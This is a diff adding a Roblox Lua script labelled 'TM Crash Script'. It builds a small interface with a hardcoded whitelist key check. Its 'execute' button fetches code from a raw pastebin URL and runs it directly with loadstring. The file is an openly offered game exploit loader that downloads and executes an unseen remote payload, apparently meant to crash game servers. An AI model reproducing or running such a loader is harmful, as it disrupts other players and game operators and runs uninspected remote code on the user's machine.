@@ -1,0 +1,168 @@
+local ScreenGui = Instance.new("ScreenGui")
+local crframe = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local execute = Instance.new("TextButton")
+local retrnb = Instance.new("TextButton")
+local TextLabel_3 = Instance.new("TextLabel")
+local wlframe = Instance.new("Frame")
+local TextLabel_4 = Instance.new("TextLabel")
+local keytb = Instance.new("TextBox")
+local check = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+crframe.Name = "crframe"
+crframe.Parent = ScreenGui
+crframe.AnchorPoint = Vector2.new(0.5, 0.5)
+crframe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+crframe.BackgroundTransparency = 0.300
+crframe.Position = UDim2.new(0.163679808, 0, 0.858565748, 0)
+crframe.Size = UDim2.new(0, 226, 0, 100)
+crframe.Visible = false
+
+TextLabel.Parent = crframe
+TextLabel.BackgroundColor3 = Color3.fromRGB(83, 83, 83)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.Position = UDim2.new(0.00442481041, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 225, 0, 38)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "TM Crash Script"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+TextLabel_2.Parent = crframe
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(83, 83, 83)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.Position = UDim2.new(0.00442477874, 0, 0.800000012, 0)
+TextLabel_2.Size = UDim2.new(0, 225, 0, 11)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Made by fay"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 14.000
+
+execute.Name = "execute"
+execute.Parent = crframe
+execute.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+execute.BackgroundTransparency = 1.000
+execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
+execute.Position = UDim2.new(0, 0, 0.723505855, 0)
+execute.Size = UDim2.new(0, 87, 0, 27)
+execute.Font = Enum.Font.SourceSans
+execute.Text = "execute"
+execute.TextColor3 = Color3.fromRGB(255, 255, 255)
+execute.TextSize = 14.000
+
+retrnb.Name = "retrnb"
+retrnb.Parent = crframe
+retrnb.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+retrnb.BackgroundTransparency = 1.000
+retrnb.BorderColor3 = Color3.fromRGB(43, 43, 43)
+retrnb.Position = UDim2.new(0.60744226, 0, 0.723505855, 0)
+retrnb.Size = UDim2.new(0, 88, 0, 27)
+retrnb.Font = Enum.Font.SourceSans
+retrnb.Text = "Return"
+retrnb.TextColor3 = Color3.fromRGB(255, 255, 255)
+retrnb.TextSize = 14.000
+
+TextLabel_3.Parent = crframe
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.Position = UDim2.new(0, 0, 0.370000005, 0)
+TextLabel_3.Size = UDim2.new(0, 225, 0, 1)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = ""
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextSize = 14.000
+
+wlframe.Name = "wlframe"
+wlframe.Parent = ScreenGui
+wlframe.AnchorPoint = Vector2.new(0.5, 0.5)
+wlframe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+wlframe.BackgroundTransparency = 0.400
+wlframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+wlframe.Position = UDim2.new(0.499402642, 0, 0.5, 0)
+wlframe.Size = UDim2.new(0, 155, 0, 222)
+
+TextLabel_4.Parent = wlframe
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.BackgroundTransparency = 0.600
+TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.Size = UDim2.new(0, 155, 0, 24)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "Whitelist System"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 14.000
+
+keytb.Name = "keytb"
+keytb.Parent = wlframe
+keytb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+keytb.BackgroundTransparency = 0.650
+keytb.BorderColor3 = Color3.fromRGB(0, 0, 0)
+keytb.Position = UDim2.new(0.0645161271, 0, 0.243243232, 0)
+keytb.Size = UDim2.new(0, 134, 0, 25)
+keytb.Font = Enum.Font.SourceSans
+keytb.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+keytb.PlaceholderText = "ENTER KEY"
+keytb.Text = ""
+keytb.TextColor3 = Color3.fromRGB(255, 255, 255)
+keytb.TextSize = 14.000
+
+check.Name = "check"
+check.Parent = wlframe
+check.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+check.BackgroundTransparency = 0.450
+check.BorderColor3 = Color3.fromRGB(0, 0, 0)
+check.Position = UDim2.new(0.207442254, 0, 0.73701936, 0)
+check.Size = UDim2.new(0, 88, 0, 27)
+check.Font = Enum.Font.SourceSans
+check.Text = "Check Key"
+check.TextColor3 = Color3.fromRGB(255, 255, 255)
+check.TextSize = 14.000
+
+
+check.MouseButton1Down:connect(function()
+
+	if keytb.Text == "key_codefay" then
+
+		wlframe.Visible = false
+		crframe.Visible = true
+
+		game.StarterGui:SetCore(
+			"SendNotification",
+			{
+				Title = "WL System",
+				Text = "Key Accepted!";
+			}
+		)
+
+	else
+
+		game.StarterGui:SetCore(
+			"SendNotification",
+			{
+				Title = "WL System",
+				Text = "Key Denied.";
+			}
+		)
+
+	end
+
+end)
+
+
+retrnb.MouseButton1Down:connect(function()
+	
+	ScreenGui:Destroy()
+	
+end)
+
+
+execute.MouseButton1Down:connect(function()
+	
+	loadstring(game:HttpGet('https://pastebin.com/raw/QJCVfgzu', true))()
+	
+end)
